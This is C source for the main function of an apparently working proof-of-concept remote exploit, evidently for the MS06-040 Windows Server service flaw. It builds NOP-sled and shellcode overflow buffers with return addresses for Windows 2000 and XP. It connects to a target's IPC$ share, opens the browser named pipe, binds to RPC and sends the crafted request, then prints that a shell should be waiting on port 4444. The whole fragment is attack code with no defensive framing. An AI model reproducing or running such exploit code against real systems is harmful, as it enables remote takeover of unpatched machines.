int main(int argc, char* argv[])
{
       HANDLE hFile;
       NETRESOURCE nr;

       char szRemoteName[MAX_PATH], szPipePath[MAX_PATH];

       unsigned int i;

       unsigned char szInBuf[4096];
       unsigned long dwRead, nWritten;

       unsigned char szReqBuf[2096];

       if (argc < 3){
               printf("[-] Usage: ms06040poc <host> [target]\n");
               printf("\t1 - Windows 2000 SP0-SP4\n");
               printf("\t2 - Windows XP SP0-SP1\n");
               return -1;
       }

       memset(szReqBuf, 0, sizeof(szReqBuf));

       if (atoi(argv[2]) == 1) {
               unsigned char szBuff[1064];

               // build payload buffer
               memset(szBuff, '\x90', 1000);
               memcpy(szBuff+630, sc, sizeof(sc));

               for(i=1000; i<1064; i+=4) {
                       memcpy(szBuff+i, "\x04\x08\x02\x00", 4);
               }

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x15\x02\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x15\x02\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+1120, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+1124, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
               memcpy(szReqBuf+1140 , "\xeb\x02", 2);
       }
       if (atoi(argv[2]) == 2) {
               unsigned char szBuff[708];

               memset(szBuff, '\x90', 612); /* size of shellcode */
               memcpy(szBuff, sc, sizeof(sc));

               memcpy(szBuff+612, "\x0a\x08\x02\x00", 4);
               memset(szBuff+616, 'A', 8); // 8 bytes padding
               memcpy(szBuff+624, "\x04\x08\x02\x00", 4);
               memset(szBuff+628, '\x90', 32);
               memcpy(szBuff+660, "\x04\x08\x02\x00", 4);
               memset(szBuff+664, 'B', 8); // 8 bytes padding
               memcpy(szBuff+672, "\x04\x08\x02\x00", 4);
               memset(szBuff+676, '\x90', 32);

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x63\x01\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x63\x01\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+764, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+768, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
       }

       printf("[+] Connecting to %s ... \n", argv[1]);

       _snprintf(szRemoteName, sizeof(szRemoteName), "\\\\%s\\ipc$", argv[1]);
       nr.dwType = RESOURCETYPE_ANY;
       nr.lpLocalName = NULL;
       nr.lpProvider = NULL;
       nr.lpRemoteName = szRemoteName;
       if (WNetAddConnection2(&nr, "", "", 0) != NO_ERROR) {
               printf("[-] Failed to connect to host !\n");
               return -1;
       }

       _snprintf(szPipePath, sizeof(szPipePath), "\\\\%s\\pipe\\browser", argv[1]);
       hFile = CreateFile(szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

       if (hFile == INVALID_HANDLE_VALUE) {
               printf("[-] Failed to open named pipe !\n");
               return -1;
       }

       printf("[+] Binding to RPC interface ... \n");
       if (TransactNamedPipe(hFile, DCERPC_Bind_RPC_Service, sizeof(DCERPC_Bind_RPC_Service), szInBuf, sizeof(szInBuf), &dwRead, NULL) == 0) {
               printf("[-] Failed to bind to interface !\n");
               CloseHandle(hFile);
               return -1;
       }

       printf("[+] Sending RPC request ... \n");
       if (!WriteFile(hFile, szReqBuf, sizeof(szReqBuf), &nWritten, 0)) {
               printf("[-] Unable to transmit RPC request !\n");
               CloseHandle(hFile);
               return -1;
       }

       printf("[+] Now check for shell on %s:4444 !\n", argv[1]);

       return 0;
}